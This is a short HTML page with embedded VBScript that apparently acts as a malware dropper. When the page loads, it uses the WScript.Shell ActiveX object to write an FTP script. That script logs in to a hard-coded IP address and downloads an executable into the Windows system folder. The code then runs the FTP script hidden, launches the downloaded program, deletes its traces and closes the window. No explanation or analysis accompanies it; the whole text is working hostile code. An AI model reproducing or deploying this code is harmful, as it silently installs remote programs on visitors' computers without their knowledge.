
<object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object>
<script language=vbscript> 
Dim fso, tf, winsys, exefile
exefile = "jian@227.cn.exe"
Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("ftp.txt",true)
winsys = fso.GetSpecialFolder(1)
tf.Writeline "open 61.152.160.124"
tf.Writeline "227.cn"
tf.Writeline "227.cn"
tf.Writeline "lcd " & winsys
tf.Writeline "get " & exefile
tf.Writeline "bye"
tf.Close
set wshshell=createobject ("wscript.shell" )
wshshell.Run "ftp -s:ftp.txt", 0 ,true
wshshell.Run winsys & "\" & exefile
fso.DeleteFile "ftp.txt",true
window.close() 
</script> 